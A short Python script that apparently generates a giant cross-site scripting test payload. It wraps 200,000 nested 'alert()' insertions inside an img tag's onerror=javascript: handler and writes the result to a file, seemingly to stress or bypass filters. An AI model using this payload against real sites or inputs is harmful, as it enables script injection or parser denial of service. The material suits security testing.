the_overflow='alert()'
the_script='<img src=x onerror=javascript:>'
s='alert()'
pos=3
for i in range(0,200000):
    s=s[:pos] + the_overflow + s[pos:]
    pos=int(len(s)/2)

s=the_script[:30]+s+the_script[30:]
f = open("alert.txt", "w")
f.write(s)
f.close()